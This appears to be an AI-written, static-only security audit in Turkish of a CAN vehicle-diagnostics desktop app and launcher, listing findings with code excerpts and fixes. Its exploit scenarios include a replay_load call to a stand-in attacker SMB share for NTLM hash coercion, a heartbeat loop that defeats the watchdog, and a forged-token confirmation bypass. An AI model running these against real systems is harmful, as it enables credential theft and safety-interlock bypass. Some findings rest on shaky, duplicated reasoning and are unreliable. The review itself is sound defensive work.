# ASAMA 6: Arayüz ve Başlatıcı Raporu
Denetçi: Claude Fable 5.1 (Hermes/cockpit) | Tarih: 2026-09-15
Kapsam: `src/ui/desktop_app.py` (3104 satır), `src/launcher/app.py` (352 satır), `src/main.py` (190 satır). Bağlam için okunan ek dosyalar: `src/core/logging.py`, `src/safety/watchdog.py` (heartbeat/lease semantiği), `src/safety/multiplexer.py` (yalnız imza), `src/safety/gateway.py` (yalnız ilgili metod imzaları), `src/ui/frontend/src/services/bridge.ts`, `docs/review/PROMPT-6.md`, `docs/review/ASAMA-1-tx-guvenlik.md`, `AGENTS.md`, `CONTRIBUTING.md`.

> **Doğrulama yöntemi:** Yalnızca statik kaynak kod okuması. Bu oturumda **hiçbir test çalıştırılmadı**, hiçbir bulgu çalışma zamanında yeniden üretilmedi. Her bulguda "Kanıt" satır referansı ile kod alıntısıdır; "Senaryo" kod okumasından türetilmiş bir tetiklenme yoludur, saha/laboratuvar doğrulaması değildir. Satır numaraları 1 tabanlıdır.
>
> **Severity ölçütü (bu rapor için):** KRİTİK = mevcut üretim wiring'inde doğrudan tetiklenebilir güvenlik bypass'ı. YÜKSEK = invariant ihlali/fail-open veya belgelenmiş-mitigasyon-bağlanmamış durum; tetiklenmesi ek koşul/çağıran gerektirir. ORTA = savunma katmanı zayıflığı / provenance belirsizliği. DÜŞÜK = sınırlı etki, fail-closed yönde veya kod kalitesi. BİLGİ = not.
>
> **Bridge yüzeyi (doğrulandı):** pywebview `js_api` nesnesinin **tüm public metodlarını** renderer'a açar (`UniversalCanDesktopApp.run`, `desktop_app.py:3063` → `js_api=api`). Bu nedenle `DesktopApiBridge` üzerindeki her public metod, çift/tek alt çizgisiz adı taşıdığı sürece JS'ten çağrılabilir bir IPC uç noktasıdır.

## 1. Yönetici Özeti

Aşama 6 (masaüstü kabuk + başlatıcı) genel olarak **fail-closed** bir istemci güvenliği duruşu sergiliyor. Öne çıkan olumlu kontroller kod okumasıyla doğrulandı:

- **Zorunlu çift onay (fail-closed):** `execute_diagnostic_action` aksiyon tiplerini bir **onay muafiyet listesi** üzerinden sınıflandırıyor; `requires_confirmation:false` bayrağı yalnızca okuma aksiyonlarını etkiliyor ve yazma aksiyonlarında **yok sayılıyor** (`desktop_app.py:1498-1515`). Bu, Aşama 1'deki [G-2] gibi "kritiklik çağırana bırakılmış" desenini UI katmanında kapatıyor.
- **Tek kullanımlık, TTL'li, aksiyona bağlı token:** `secrets.token_hex(16)` + 30 s TTL + `action_type`/`action_id` eşleşmesi + `pop` ile atomik tek-kullanım (`1431-1479`). `arm_tx` yolu token/güvenlik sırası doğru (`1211-1248`).
- **Path traversal'a karşı pozitif kök allowlist:** telemetri yükleme `exports/`, `logs/`, `data/traces/` köklerine hapsedilmiş; eski substring-deny + uzantı "allowlist" deseni kaldırılmış (`508-567`).
- **IPC'den gelen dosya adı sanitizasyonu:** `cloud_upload_raw_content` adı `[^a-zA-Z0-9_.-] → _` ile normalleştirip staging'i `O_CREAT|O_EXCL|0o600` ile açıyor (`602-660`).
- **Launcher:** `shell=False`, `timeout=300`, CLI argümanları için **allowlist** (`_ALLOWED_EXTRA_ARGS`), dev overrode yalnızca frozen olmayan ortamda ve **asla** preflight kapısını açmıyor (`app.py:155, 240-294, 34-46, 339-348`).
- **main.py:** `--tx / shell=True` yok; CLI yolu **daima** `listen_only=True` (H-3/P1-2). SBOM'luk bir TX yüzeyi bırakılmamış (`main.py:106-117`).

Buna rağmen **1 KRİTİK**, **5 YÜKSEK**, **5 ORTA**, **5 DÜŞÜK** ve **4 BİLGİ** bulgu var. Bunlar üç tema altında toplanıyor:

1. **Kritik olmayan bir IPC ucundan ham OS yoluna erişim (C-1, KRİTİK).** `replay_load(file_path)` ve `load_replay(file_path)` **herhangi bir kök allowlist uygulamıyor** — process FS bağlamında `Path.resolve()` + `open`. Windows'ta UNC ile SMB kimlik doğrulaması tetiklenebilir (NTLM coercion / "hashing out" yoluyla kimlik sızıntısı); ayrıca `<root>/dist/` yazılırsa launcher'ın `resolve_target_executable()` seçimi **yönlendirilebilir** (origin-to-origin escalation). `cloud_upload_raw_content` da "F-4" olarak işaretlenmiş sanitizasyonu **atlıyor** — ölü güvenlik kodu.
2. **"Yazma ≠ kritik" varsayımı ile token kapısının atlanması (H-1).** Token `confirmation_token`/`action.confirmation_token`/`action.token`/string `user_confirmed` alanlarından **herhangi birinden** alınıyor (`1552-1558`). Bu, Aşama 5 (telafi planı) ve `CONFIRMATION_EXEMPT_ACTIONS`'ın dar tutulmasıyla savunuluyor; ancak desen kırılgan ve invariant'ı çağıran verisine bağlıyor. Aşama 1 [G-3] ile **aynı kök neden**.
3. **Watchdog ekseninde fail-open (H-2/H-3).** `heartbeat()` `caller_token` **vermiyor** → watchdog `logger.warning("…legacy path")` yolu (`desktop_app.py:321`, `watchdog.py:84-85`). Bir 800 ms liveness interlock'u kendi "legacy" yolundan besleniyor. Ayrıca watchdog `TxSafetyGateway`'e bağlı değilse/kalıcı heartbeat sözleşmesi bozulursa, `is_lease_valid` ile lease doğrulaması **fail-open** olur (`watchdog.py:97-99`) — Aşama 1 [S-1] ile aynı desende.

**Jenerik ama gerçek:** `_push_telemetry_tick` ve `_push_flash_progress` `json.dumps(...)` çıktısını `evaluate_js` içine ham gömüyor (`888-889, 2087, 2096, 3012-3014`). JSON kaçışı string alanlarını metin olarak güvenliyor (script-context için değil). **Bu nedenle "self-XSS / console injection" bulgusu üretmiyorum** — `event.data`'nın gerçek bir CORS bypass olduğu çağrısı yapılmadı (Bölüm 4'te "kanıtlanmamış" olarak ayrıldı).

ASIL-B/D duruşu: UI/IPC katmanının çift-onay, token ve upload-yolu kontrolleri ASIL-B hedefiyle uyumlu görünüyor; ancak (a) ham yol gerçekten **tek uç noktada** (replay) korumasız, (b) liveness interlock'un token disiplini UI tarafından kullanılmıyor ve (c) launcher'da güven kararı diske yazılan `dist/` ağacına ve `sys.path` girişine dayanıyor. Bu üç nokta izlenebilirlik için kapatılmalı.

## 2. Bulgu Tablosu

| # | dosya:satır | severity | sorun | senaryo | düzeltme |
|---|---|---|---|---|---|
| C-1 | `desktop_app.py:1867-1874`, `:235-237` | KRİTİK | `replay_load`/`load_replay` IPC'den gelen `file_path`'i **kök allowlist olmadan** `Path.resolve()` edip açıyor | WebView'den `replay_load("\\\\attacker\\share\\x.asc")` → launcher'ın dev kopyası SMB'ye bağlanır, ağa NTLM hash gider; `<root>/dist/` yazılırsa `resolve_target_executable()` 0x-bit yolunu `dist/ucanlab.exe`'ye çevirir | `load_replay`'i de `_validate_telemetry_upload_path` ile aynı pozitif kök allowlist'ine (`data/traces/`, `logs/`, `exports/`) bağla; UNC (`\\\\`/`//`) ve aygıt yollarını (`\\\\.\\`, `CON`, `COMx`) fail-closed reddet |
| U-1 | `desktop_app.py:602-660`, özellikle `:613` | YÜKSEK | `cloud_upload_raw_content` "F-4" yorumlu sanitizasyonu **kullanmıyor** — ölü kod; ad `O_EXCL` staging dosyasından türeyip upload ediliyor | Frontend upload akışı ham içerik uçunu kullanıyorsa F-4 sözleşmesi fiilen yok; ad sanitizasyonu yalnız yorum iddiası | `clean_name`'i tek bir ortak `_sanitize_upload_filename()` içinde topla ve **her iki** upload yolunda çağır; F-4 yorumunu davranışla eşleştir |
| H-1 | `desktop_app.py:1552-1567`, `:1933-1940` | YÜKSEK | Token `confirmation_token` **veya** `action.confirmation_token`/`action.token`/string `user_confirmed` alanlarından alınıyor → belirli bir kanalın "ikinci onay" olduğu invariant'ı çağıran verisine bağlı | Aşama 5'in telafi planı savunuyor ama kırılgan: renderer `action.token` alanını kendi doldurup tek-çağrılık onay üretebilir (Aşama 1 [G-3] deseninin tekrarı) | Yalnız `confirmation_token` parametresini kabul et; `action.token`/string `user_confirmed` geri-uyumluluk yollarını kaldır; token üretimini OS-native diyalog/ikinci kanala taşı |
| H-2 | `desktop_app.py:319-322`; `watchdog.py:77-87` | YÜKSEK | `DesktopApiBridge.heartbeat()` watchdog'u **`caller_token` olmadan** besliyor → `logger.warning("watchdog heartbeat without caller_token (legacy path)")`; her `execute` sırasında da token'sız | 800 ms liveness interlock'u "legacy" yoldan tazelenir; token zorunlu kılınırsa heartbeat başarısız → lease 800 ms'de düşer → yanlış FAULT/E-Stop | Bridge `heartbeat`'e out-of-band bir `caller_token` ver (bridge↔watchdog init'te paylaşılan secret) ve `arm_tx` içi `self.watchdog.heartbeat()` çağrısını da token'lı yola geçir |
| H-3 | `watchdog.py:97-99` (çağrı: `desktop_app.py:1242`) | YÜKSEK | `is_lease_valid` bir **anlık görüntü** (zaman karşılaştırması); gateway her frame'de yeniden doğrulamıyor. Kalıcı heartbeat akışı kesilirse lease **fail-open** kalır | Kötü niyetli devtools betiği `setInterval(heartbeat, 200)` ile liveness interlock'unu süresiz tatmin eder; watchdog monitor'u fiilen devre dışı kalır | Gateway `validate_and_transmit` içinde lease kontrolünü (fence generation benzeri) monotonik damgayla **per-frame** yap; heartbeat'in UI rAF'e bağlı kalmasını sağla (F-16/E-11). Not: çağrı yolu kısmı doğrulanamadı (§4) |
| H-4 | `desktop_app.py:613` (ölü koddan türeyen staging) | YÜKSEK | (U-1 ile aynı kök) F-4 sözleşmesinin **bağlanmamış** olması; `re.sub` sanitizasyonu yalnız staging dosyasında | Bkz. U-1 | Bkz. U-1 |
| O-1 | `desktop_app.py:1242-1244` | ORTA | `arm_tx` içinde `self.watchdog.heartbeat()` çağrısı `self.supervisor.arm_tx(...)` satırından **önce** (1244) — arm sırasında lease'i tazeleyerek başlangıç yarışını maskeliyor | Arm öncesi lease zaten dolmuşsa token'sız heartbeat ile 800 ms daha TX yetkisi alınır | Heartbeat'i arm'den **bağımsız** yap; arm yalnız `is_lease_valid` kontrol etsin, tazelemeyi UI rAF'i sürdürsün |
| O-2 | `desktop_app.py:1311-1328` | ORTA | `toggle_simulator` yalnız `self._is_estop` bayrağını kontrol ediyor (`:1316`); `estop.is_engaged` ile senkron değil | İki E-Stop temsili ayrışırsa (`_is_estop=False`, `estop.is_engaged=True`) simülatör "clear"a dönük toggle kabul edilir | Kontrolü `if self._is_estop or self.estop.is_engaged:` yap (execute_diagnostic_action ile aynı çift kontrol) |
| O-3 | `desktop_app.py:1311-1340` | ORTA (docstring hatası) | `toggle_simulator` docstring "previous silent minted-token reset made this JS-reachable button an E-Stop bypass" diyor; güncel kodda **mint yolu yok** (`_is_estop` kontrolü + P0-1 kaldırması) → yanıltıcı atıf | Denetim izi yanlış nedene bağlanır; gelecekteki refactor "eski bypass" zanneder | Docstring'i "toggle engages/implies safe default" olarak düzelt; `_is_estop` bayrağını tek kaynak (`estop.is_engaged` türetilmiş property) yap |
| O-4 | `desktop_app.py:1569-1576` | ORTA | `_ensure_armed` yalnız `state == PASSIVE` iken arm ediyor; `ACTIVE`/`FAULT`/`STARTUP` durumunda arm denemesi yok, hata mesajı "TX pipeline cannot be armed" | SIM kapatıldıktan sonra state PASSIVE değilse kritik aksiyonlar sessizce başarısız olur (fail-closed ama tanılama zayıf) | `if not self.supervisor.is_tx_permitted:` kullan ve durumu log'a ekle |
| O-5 | `desktop_app.py:235-237`, `:1867-1874` | ORTA | `replay_load` bağımsız bir IPC ucu olarak **tip aralığı** doğrulaması yok (string zorlanmıyor, uzunluk sınırı yok) | Aşırı uzun/emoji yollarla log ve FS amplifikasyonu; C-1'in yüzeyi | `str`+`os.fspath` zorla, uzunluk sınırı koy, C-1 allowlist'ini uygula |
| D-1 | `main.py:127-152` | DÜŞÜK | Recev retry döngüsü `except Exception` ile `consecutive_failures` sayar; `RATE_LIMIT/BUS_OFF` gibi kalıcı durumlarda 20 deneme boyunca 1 s park edebilir | Saha sniffing sırasında geçici gösterge; davranış fail-closed yönde | Hata sınıflandırması (transient vs kalıcı) ve `bus_off` sonrası yeniden başlatma politikası ekle |
| D-2 | `desktop_app.py:613` | DÜŞÜK | `strip("._")` sonrası boş ad `telemetry_upload.bin`'e düşüyor; Windows rezerve adları (`CON`, `NUL`, `COM1`) engellenmiyor | Rezerve ad staging dizininde `FileExistsError` döngüsünü tetikleyip 5 denemede başarısız olur | Ad sanitizasyonunda Windows rezerve ad listesini reddet |
| D-3 | `launcher/app.py:111` | DÜŞÜK | `run_preflight` içinde `self.update_manager._check_for_updates_unverified(...)` **private** metod çağrılıyor; imzasız manifest yalnız "test-only" yorumuyla korunuyor | Gelecekte biri `custom_update_manifest`'i production'da geçirirse imza kapısı atlanır | `_check_for_updates_unverified`'i yalnız test build'i (`pytest`/env) altında erişilebilir yap veya `main()`'de `custom_update_manifest is None` assert et |
| D-4 | `launcher/app.py:86-100` | DÜŞÜK | `resolve_target_executable` **diskte hangi dosya varsa** onu seçiyor; `dist/` yazılabilirse seçim yönlendirilebilir (C-1 ile birlikte) | `<root>/dist/` kontrolü ele geçirilirse imzasız `ucanlab.exe` seçilir | Seçilen ikiliyi bir manifestle (hash) doğrula; `dist/`'i yazma-korumalı varsay |
| D-5 | `main.py:17-20`, `launcher/app.py:17-20` | DÜŞÜK | `sys.path.insert(0, <root>)` — kök dizin en yüksek öncelikli import kaynağı olur | Yazılabilir kurulum dizininde CWD/kök import ele geçirme | `sys.path` yalnız `__main__` modülü için ekle; frozen build'de repo kökünü hiç ekleme |
| B-1 | `launcher/app.py:31`, `desktop_app.py:79` | BİLGİ | Aynı Ed25519 public key iki dosyada **duplike** (drift riski) | Anahtar rotasyonunda biri güncellenmezse imza doğrulaması sessizce bölünür | Tek bir `src/security/cloud/keys.py`'den import et |
| B-2 | `desktop_app.py:602-660` | BİLGİ | `cloud_upload_raw_content` staging için gövdeyi hiç yazmayan bir "önce sanitize" yorumu var; staging'den upload ediliyor | Davranış doğru ama ölü kod yanıltıcı | Ölü kodu kaldır |
| B-3 | `desktop_app.py:271-275` | BİLGİ | `get_dtc_info` bilinmeyen kodu **boş dict** döndürüyor (fail-open görünümlü ama istismar yüzeyi değil) | UI "bilinmeyen DTC" yerine "veri yok" gösterir | `{"success": False, "error": ...}` sözleşmesine geç (opsiyonel) |
| B-4 | `desktop_app.py:117-122` | BİLGİ | `VALID_SCENARIOS`/`VALID_FAULTS` `ClassVar[frozenset[str]]` — fine; ancak `select_scenario`/`inject_fault` **casefold** ile normalize edip allowlist'e sokuyor (doğru) | Not: iyi uygulama | — |

*Severity: KRİTİK | YÜKSEK | ORTA | DÜŞÜK | BİLGİ*

## 3. Detaylı Bulgular (Tüm KRİTİK ve YÜKSEK Seviyeler)

### [C-1] `replay_load`/`load_replay`: IPC → yolsuz `Path.resolve()`; SMB kimlik zorlaması ve launcher yolu ele geçirme
- **Konum:** `src/ui/desktop_app.py:235-237` (bridge), `:1867-1874` (implementation). Doğrulama: `Path(file_path).resolve()` üzerinde **hiçbir allowlist/`is_relative_to`** yok — karşılaştırın: `_validate_telemetry_upload_path` (`:532-567`) tam da bu kontrolü yapıyor.
- **Etki / Risk:** Renderer'dan gelen serbest yol, process'in ayrıcalıklarıyla açılıyor. (a) **Windows UNC/SMB:** `\\host\share\f.asc` ile `ReplayBus.from_trace_file()` `open()` çağırır; işletim sistemi SMB'ye bağlanıp NTLM kimlik doğrulaması dener → iyi bilinen **NTLM coercion / "hashing out"** sınıfı sızıntı; kurumsal ortamda domain credential hash'i saldırgana gider. (b) **Launcher yolu:** `UniversalCanLauncher.resolve_target_executable` (`launcher/app.py:86-100`) diskte var olan ilk adayı seçiyor; `<root>/dist/ucanlab.exe` yazılabilirse seçim ele geçirilir. (c) İçerik okuma raporu (`frame_count`, `path`) zaten renderer'a döndüğü için sessiz exfil kanalı değil, ancak **kimlik sızıntısı ve launcher yolu ele geçirme** bu uç üzerinden tetiklenebilir.
- **Kanıt / Zafiyet Analizi:** İki yol da aynı desende; ikisinde de allowlist yok:
  ```python
  # desktop_app.py:1867-1874
  def load_replay(self, file_path: str) -> dict[str, Any]:
      try:
          path = Path(file_path).resolve()          # <- allowlist YOK
          self.replay_bus = ReplayBus.from_trace_file(path)
          return {"success": True, "frame_count": ..., "path": str(path)}
      except Exception as exc:
          return {"success": False, "error": str(exc)}
  ```
  ```python
  # desktop_app.py:532-567 (karşılaştırma: DOĞRU desen)
  resolved = Path(file_path).resolve()
  ...
  if not any(resolved.is_relative_to(root) for root in allowed_roots):
      raise ValueError("Guvenlik politikasi: yalnizca uygulamanin kendi export/log/trace dizinlerindeki dosyalar yuklenebilir.")
  ```
  Bridge yüzeyinde `replay_load` public'tir (`:235`) ve `js_api=api` (`:3063`) ile renderer'a açıktır → doğrudan JS'ten çağrılabilir.
- **İstismar / Tetiklenme Senaryosu:** WebView içinde çalışan bir betik (XSS, devtools console veya kötü niyetli eklenti) şunları yapar. (1) `pywebview.api.replay_load("\\\\attacker.example\\share\\poc.asc")` → SMB bağlanır, NTLM el sıkışması saldırgana ulaşır. (2) `pywebview.api.replay_load("<root>\\dist\\..\\dist\\ucanlab.exe")` benzeri yol manipülasyonlarıyla launcher'ın sonraki başlatmasında seçilecek aday denenir. (3) `pywebview.api.replay_start()` ile yüklenen veriyi ingestion hattına basar. Tüm adımlar için gereken tek şey renderer'da kod çalıştırabilmek; ek onay yoktur.
- **Düzeltme (Remediation):**
  ```python
  _REPLAY_ROOTS = (("data", "traces"), ("logs",), ("exports",))
  def load_replay(self, file_path: str) -> dict[str, Any]:
      p = str(file_path or "").strip()
      if "\\\\" in p or p.startswith("//") or p.startswith("\\\\.\\") or p.startswith("//?/"):
          return {"success": False, "error": "Ağ/aygıt yolları reddedildi."}       # UNC & device fail-closed
      resolved = Path(p).resolve()
      roots = tuple((_app_data_root().joinpath(*r)).resolve() for r in self._REPLAY_ROOTS)
      if not any(resolved.is_relative_to(root) for root in roots):
          return {"success": False, "error": "Yalnız uygulama trace dizinleri yüklenebilir."}
      if not resolved.is_file():
          return {"success": False, "error": "Dosya bulunamadı."}
      ...
  ```
  Ayrıca `resolve_target_executable()` sonucunu bir hash manifestiyle doğrula (D-4 ile birlikte).

### [U-1] `cloud_upload_raw_content`: F-4 sanitizasyon sözleşmesi koda bağlanmamış
- **Konum:** `src/ui/desktop_app.py:602-660`; sanitize edilen ad `:613`, staging `:628-644`, upload `:648`.
- **Etki / Risk:** Yorum "F-4: Sanitize filename to prevent directory traversal or alternate stream injection" diyor (`:612`), ancak `clean_name` **yalnız staging dosyası adını** kuruyor (`:629`); içerik doğrudan `stage_dir` altında `O_EXCL|0o600` ile yazılıp upload ediliyor. `cloud_upload_session` yolunda (`:532-567`) `_validate_telemetry_upload_path` çağrıldığı halde bu uçta çağrılmıyor → "tek doğrulama fonksiyonu" sözleşmesi iki upload yolunda bölünmüş. Ad sanitizasyonunun (`re.sub`) asıl değeri, staging yolunun `_app_data_root()/exports/.upload_stage` altında kalmasını sağlamak — yani **travmatik değil ama tek noktada**. Ölü işaretlenen kontrolün varlığı denetim izini zayıflatır.
- **Kanıt / Zafiyet Analizi:**
  ```python
  # desktop_app.py:612-615
  # F-4: Sanitize filename to prevent directory traversal or alternate stream injection
  clean_name = re.sub(r"[^a-zA-Z0-9_.-]", "_", Path(filename).name).strip("._")   # <- bu satır hiç "validate" etmiyor
  if not clean_name:
      clean_name = "telemetry_upload.bin"
  ```
  Kabul edilen yol: `_validate_telemetry_upload_path` **yalnız** `cloud_upload_session` (`:571`) tarafından kullanılıyor; ham içerik ucu kendi staging'ini üretiyor (`:622-648`).
- **İstismar / Tetiklenme Senaryosu:** Renderer `cloud_upload_raw_content("..\\..\\evil.asc", <bytes>)` çağırır → `Path("..\\..\\evil.asc").name` Windows'ta son bileşeni alır, `clean_name` zaten `_`'ye döner; staging güvenli. **Ancak** sözleşme "tek sanitizasyon" iddiasını taşırken fiilen yalnız staging adına uygulanıyor; F-4'ün gelecekte başka bir yolla (ör. `vehicle_vin`, dosya uzantısı politikası) genişlemesi hâlinde bu uç korunmasız kalır.
- **Düzeltme (Remediation):**
  ```python
  @staticmethod
  def _sanitize_upload_filename(filename: str) -> str:
      name = re.sub(r"[^a-zA-Z0-9_.-]", "_", Path(str(filename or "")).name).strip("._")
      reserved = {"", "CON", "PRN", "AUX", "NUL", *{f"COM{i}" for i in range(1, 10)}, *{f"LPT{i}" for i in range(1, 10)}}
      if not name or name.upper().split(".")[0] in reserved:
          return "telemetry_upload.bin"
      return name
  # her iki upload yolunda TEK çağrı noktası
  ```
  ve ham içerik akışını mümkünse `cloud_upload_session` semantiğine (yol → `_validate_telemetry_upload_path`) indirge.

### [H-1] `execute_diagnostic_action`/`flash_start`: token çoklu kaynaktan alınıyor → "yazma = onaylı" invariant'ı çağırana bağlı
- **Konum:** `desktop_app.py:1552-1567` (`execute_diagnostic_action`), `:1932-1940` (`flash_start`).
- **Etki / Risk:** Aktivasyon muafiyeti (**allowlist dışı = zorunlu**), Aşama 1 – REVIEW 3'te fail-closed olarak doğru kurulmuş; ancak token **kanalı** sabit değil: `confirmation_token` parametresi, `action.confirmation_token`, `action.token` ve string `user_confirmed` sırayla deneniyor. Aşama 1 [G-3] ile **aynı kök neden**: onayın bağımsız bir dış kanaldan geldiği garantisi kernel tarafından değil, çağıranın veri şekline bırakılmış. Bu, Aşama 5'in (telafi planı) ve `CONFIRMATION_EXEMPT_ACTIONS`'ın dar tutulmasının üzerine kurulu; o iki savunma zayıflar/gevşetilirse doğrudan bypass'a dönüşür.
- **Kanıt / Zafiyet Analizi:**
  ```python
  # desktop_app.py:1552-1567
  if requires_conf:
      token_candidate = confirmation_token
      if not token_candidate or not isinstance(token_candidate, str):
          token_candidate = action.get("confirmation_token") or action.get("token")   # <- çoklu kanal
      if not token_candidate and isinstance(user_confirmed, str):
          token_candidate = user_confirmed                                           # <- string'e izin
      valid, reason = self._verify_and_consume_diagnostic_token(token_candidate, action_type, action_id)
      if not valid:
          ... return False
  ```
  Zorunlu-tip kararı `:1498-1515` (fail-closed, korunuyor):
  ```python
  CONFIRMATION_EXEMPT_ACTIONS = frozenset({"uds_read_did","uds_read_vin","read_did","read_vin","j1939_dm1_query","j1939_dm1"})
  if action_type in CONFIRMATION_EXEMPT_ACTIONS:
      requires_conf = False
  else:
      requires_conf = True
      if action.get("requires_confirmation") is False:
          logger.warning("...tried to disable dual confirmation...ignored (type-mandatory gate)")
  ```
  **Doğrulama sınırı:** `action.token`'ın gerçekten `mint` edilebilir bir alan olup olmadığı frontend (`src/ui/frontend/src/services/bridge.ts`) tarafında bu oturumda tam okunmadı; bu nedenle "KRİTİK" değil "YÜKSEK" (ek koşul/çağıran gerekir).
- **İstismar / Tetiklenme Senaryosu:** Bridge'e erişen bir betik, `request_diagnostic_challenge({"action_type":"uds_ecu_reset"})` ile **kendi** token'ını alır (mint hâlâ aynı renderer'da) ve `action.token` alanını doldurarak `execute_diagnostic_action({"action_type":"uds_ecu_reset","token":<token>})` çağırır. Onay bağımsız bir kanaldan **hiç** gelmez; yalnız whitelist + fiziksel hız interlock'u + E-Stop kalır. Aşama 1 [G-3]'teki `confirmation_secret` bağlanmadığı için gateway Stage 5 da bu yola katkı yapmaz.
- **Düzeltme (Remediation):**
  ```python
  if requires_conf:
      if not isinstance(confirmation_token, str) or not confirmation_token.strip():
          return {"success": False, "error": "Onay token'ı zorunlu (tek kanal)."}
      valid, reason = self._verify_and_consume_diagnostic_token(
          confirmation_token.strip(), action_type, action_id)
  ```
  `action.token` / string `user_confirmed` geri-uyumluluk yollarını kaldır; token üretimini bridge'ten çıkarıp OS-native onay diyaloğuna/ikinci kanala taşı; gateway Stage 5'i `confirmation_secret` ile fail-closed hâle getir (Aşama 1 [G-3] düzeltmesiyle eşzamanlı).

### [H-2] UI watchdog'u token'sız besliyor — liveness interlock "legacy" yolu
- **Konum:** `desktop_app.py:319-322` (`DesktopApiBridge.heartbeat`), `:1242-1243` (`arm_tx` içi heartbeat); watchdog tarafı `watchdog.py:77-87`.
- **Etki / Risk:** Watchdog `heartbeat(caller_token=None)` çağrısını "legacy path" olarak `logger.warning`'lıyor ve **yine de** lease'i tazeliyor. UI bunu her render pulse'ında yaptığı için 800 ms liveness interlock'u tamamen aynı süreçteki, kimliği doğrulanmamış bir çağrı akışına bağlı. Token zorunlu kılınırsa (ki Aşama 1 notlarında önerilmiş) bridge **hiç** token üretmediği için heartbeat sessizce başarısız olur → lease 800 ms'de düşer → üretimde **kendiliğinden** FAULT/E-Stop. Yani mevcut hâl, düzeltmeyi uygulandığında sistemi kıracak şekilde yanlış kablolanmış.
- **Kanıt / Zafiyet Analizi:**
  ```python
  # desktop_app.py:319-322
  def heartbeat(self) -> bool:
      self.app.watchdog.heartbeat()      # caller_token YOK
      return True
  ```
  ```python
  # watchdog.py:77-87
  def heartbeat(self, caller_token: str | None = None) -> None:
      if caller_token is None:
          logger.warning("watchdog heartbeat without caller_token (legacy path)")
      with self._lock:
          self._last_heartbeat_time = self._clock.now_monotonic()   # tazeliyor
  ```
  `arm_tx` içindeki ikinci çağrı da tokensız: `desktop_app.py:1242-1243`.
- **İstismar / Tetiklenme Senaryosu:** (1) Operatör TX arm eder. (2) Kötü niyetli/bozuk renderer `setInterval(() => pywebview.api.heartbeat(), 200)` ile lease'i süresiz tazeler. (3) Başka bir nedenle UI donarsa/arkaplana atılırsa gerçek heartbeat durur → 800 ms içinde watchdog FAULT tetikler ve TX iptal edilir; kullanıcı bunu bir güvenlik ihlali değil bir "kararsızlık" olarak yaşar (fail-closed ama neden izlenemez).
- **Düzeltme (Remediation):**
  ```python
  # __init__ içinde bridge'e paylaşılan token ver
  self.watchdog.issue_caller_token(role="ui", token=token_hex(32))
  # bridge
  def heartbeat(self, caller_token: str | None = None) -> bool:
      if not caller_token or not hmac.compare_digest(caller_token, self._ui_lease_token):
          return False
      self.app.watchdog.heartbeat(caller_token=self._ui_lease_token)
      return True
  ```
  `arm_tx` içindeki `self.watchdog.heartbeat()`'i kaldır (tazeleme yalnız UI rAF'ten; Bkz. O-1).

### [H-3] Watchdog lease denetimi snapshot'tır; kalıcı heartbeat akışı kesilmediği sürece fail-open
- **Konum:** `watchdog.py:97-99` (`is_lease_valid`); çağrı noktası `desktop_app.py:1242-1243`. Düzeltme referansı: Aşama 1 [S-1] ile aynı desen.
- **Etki / Risk:** `is_lease_valid` yalnız **anlık** `now - _last_heartbeat_time <= timeout_sec` karşılaştırması yapar; gateway her frame'de bunu sürekli değerlendirmez. Bir TX yolu boyunca lease dolduysa, watchdog monitor'ü tetiklemeden **önce** heartbeat gelirse hiçbir ihlal oluşmaz. "Liveness interlock" rolü ancak `_monitor_loop_once` periyodik olarak `force` çalışmasına bağlı; `stop()` edilmiş veya wedge olmuş bir monitor'de bu yol yoktur (watchdog kendi wedge eskalasyonunu yapıyor ama bu ayrı bir yol).
- **Kanıt / Zafiyet Analizi:**
  ```python
  # watchdog.py:96-99
  @property
  def is_lease_valid(self) -> bool:
      with self._lock:
          return (self._clock.now_monotonic() - self._last_heartbeat_time) <= self.timeout_sec
  ```
  ```python
  # desktop_app.py:1242-1243
  if not self.watchdog.is_lease_valid:
      self.watchdog.heartbeat()
  ```
  Dikkat: Buradaki kontrol yalnız `arm_tx` sırasında bir kez yapılıyor; TX sırasında gateway per-frame lease doğrulaması yapmıyor (Bkz. §4 — bu çağrı yolu doğrulanamadı, bu yüzden iddia "belirsiz" sınırında; somut fail-open noktası `is_lease_valid`'in salt zaman-karşılaştırmalı doğasıdır).
- **İstismar / Tetiklenme Senaryosu:** Kalıcı, token'sız heartbeat akışı (`setInterval`) liveness interlock'unu süresiz tatmin eder; monitor thread canlı kaldığı sürece hiç FAULT/E-Stop oluşmaz. Bu, "tek süreç-içi çağıran TX yetkisini uzanımsız tutabilir" anlamına gelir.
- **Düzeltme (Remediation):**
  ```python
  # gateway.validate_and_transmit Stage 0 benzeri yeni bir aşama:
  if getattr(self.watchdog, "is_lease_valid", True) is False:
      raise SafetyError("TX watchdog lease expired", code="WATCHDOG_LEASE_EXPIRED")
  # watchdog tarafında monotonik bir "lease_epoch" sayacı yay ve heartbeat'te artır;
  # gateway bu epoch'u her TX'te beklenenle karşılaştırsın (fence benzeri)
  ```

### [H-4] Ham içerik upload'ında sanitizasyon sözleşmesinin bağlanmamış olması (U-1 ile aynı kök, ayrı etki yüzeyi)
- **Konum:** `desktop_app.py:612-615`, `:622-648`.
- **Etki / Risk:** U-1'in ikinci sonucu: F-4 olarak belgelenen `re.sub` sanitizasyonu **yalnız** staging dosya adına uygulandığından, uzantı politikası (`UPLOAD_EXTENSION_HINTS`) veya `vehicle_vin` gibi diğer upload kontrolleri bu uçta devreye girmiyor. `cloud_upload_raw_content` bir **path** almıyor ama stage edilen dosyanın adı sözleşmeye göre "sanitize" ise de aslında "normalize" ediliyor; belgelenen güvenlik fonksiyonu ile davranış eşleşmiyor. Staging dizini (`exports/.upload_stage`) `_validate_telemetry_upload_path` kök allowlist'inde yok — yalnız yorumla "app-owned" varsayılıyor.
- **Kanıt / Zafiyet Analizi:** U-1'deki alıntı. Ek olarak `_upload_roots()` (`:508-514`) `.upload_stage` içermez; staging dışında dolaşıp temizlenmeyen artık dosya, sonraki `cloud_upload_session` çağrısında allowlist dışında olduğu için "yüklenemez" duruma düşer (işlevsel boşluk, güvenlik açısından fail-closed).
- **İstismar / Tetiklenme Senaryosu:** F-4'ün gelecekte ek uzantı/`vehicle_vin` doğrulamasıyla genişletilmesi durumunda ham içerik ucu bu kontrolleri **otomatik** almayacaktır; sözleşme iki uçta ayrışır.
- **Düzeltme (Remediation):** U-1'deki `_sanitize_upload_filename` tek fonksiyonunu benimse; staging dizinini `_upload_roots()`'a ekleyip artık dosya temizliğini garanti et.

## 4. Doğrulanamayan / Dış Bağımlılıklar

